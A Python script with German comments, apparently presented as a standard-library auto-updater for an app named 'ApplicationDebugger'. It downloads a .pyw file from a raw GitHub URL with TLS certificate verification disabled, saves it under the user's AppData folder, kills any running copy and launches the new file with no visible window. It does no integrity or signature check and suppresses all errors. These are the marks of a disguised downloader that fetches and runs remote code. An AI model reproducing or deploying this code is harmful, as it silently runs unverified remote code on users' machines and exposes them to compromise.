"""
Einfacher, robuster Auto-Updater für Windows & Linux
Ohne externe Pakete (nur Standardbibliothek)
"""

import ssl
import sys
import os
import time
import urllib.request
import subprocess
import shutil
import platform

# ────────────────────────────────────────────────
# KONFIGURATION
APP_NAME       = "ApplicationDebugger"  # Name deiner Anwendung
FILE_NAME      = "applicationdebugger.pyw"      # Name der Hauptdatei deiner Anwendung
UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME

# ───────────────────────────────────────────────

# Pfade relativ zum Updater-Skript
LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
APP_DIR       = os.path.join(LOCAL_APPDATA, APP_NAME)
APP_PATH      = os.path.join(APP_DIR, FILE_NAME)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))

IS_WINDOWS = platform.system().lower() == "windows"


def kill_running_main():
    """Beendet nur die Hauptanwendung, nicht den Updater selbst"""
    if not IS_WINDOWS:
        return

    try:
        subprocess.run(
            ["taskkill", "/F", "/IM", FILE_NAME],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW # type: ignore
        )
        time.sleep(1)
    except:
        pass


def download_update():
    """Lädt die neue Version herunter"""
    temp_path = APP_PATH + ".new"

    try:
        context = ssl._create_unverified_context()
        with urllib.request.urlopen(UPDATE_URL, timeout=15, context=context) as resp:
            if resp.status != 200:
                return None
            data = resp.read()

        os.makedirs(APP_DIR, exist_ok=True)

        with open(temp_path, "wb") as f:
            f.write(data)

        return temp_path

    except Exception:
        if os.path.exists(temp_path):
            try:
                os.unlink(temp_path)
            except:
                pass
        return None


def apply_update(temp_file):
    """Ersetzt die alte Datei mit der neuen"""
    attempts = 5

    for i in range(attempts):
        try:
            if os.path.exists(APP_PATH):
                try:
                    os.remove(APP_PATH)
                except PermissionError:
                    kill_running_main()
                    time.sleep(1 + i)

            shutil.move(temp_file, APP_PATH)

            try:
                os.chmod(APP_PATH, 0o755)
            except:
                pass

            return True

        except PermissionError:
            kill_running_main()
            time.sleep(1 + i)
        except Exception:
            return False

    return False


def start_main_app():
    """Startet die Hauptanwendung zuverlässig unter Windows & Linux"""
    if not os.path.exists(APP_PATH):
        return False

    creationflags = subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0 # type: ignore

    try:
        if APP_PATH.lower().endswith((".py", ".pyw")):
            # mit gleichem Python starten wie der Updater
            subprocess.Popen(
                [sys.executable, APP_PATH],
                creationflags=creationflags
            )
        else:
            # exe direkt starten
            subprocess.Popen(
                [APP_PATH],
                creationflags=creationflags
            )
        return True
    except Exception as e:
        print("Startfehler:", e)
        return False



def main():
    os.makedirs(APP_DIR, exist_ok=True)

    kill_running_main()
    time.sleep(1)

    new_file = download_update()

    success = False
    if new_file:
        success = apply_update(new_file)

    start_main_app()
    sys.exit(0)


if __name__ == "__main__":
    main()
